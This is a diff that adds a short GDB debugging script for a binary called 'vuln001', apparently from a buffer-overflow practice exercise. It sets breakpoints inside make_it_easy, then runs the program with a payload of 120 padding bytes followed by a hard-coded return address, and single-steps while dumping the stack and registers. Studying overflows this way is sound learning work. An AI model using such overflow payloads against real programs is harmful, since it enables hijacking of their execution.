@@ -1,0 +1,27 @@
+file vuln001
+#break main
+#break never_exec
+#break make_it_easy
+break *make_it_easy+240
+break *make_it_easy+245
+disass make_it_easy
+
+r `python -c 'print "C"*120+"\xf5\x48\x55\x55\x55\x55"'`
+x/50x $rsp
+next
+x/50x $rsp
+next
+si
+si
+si
+si
+info registers
+si
+info registers
+si
+
+
+
+
+
+r "hola"
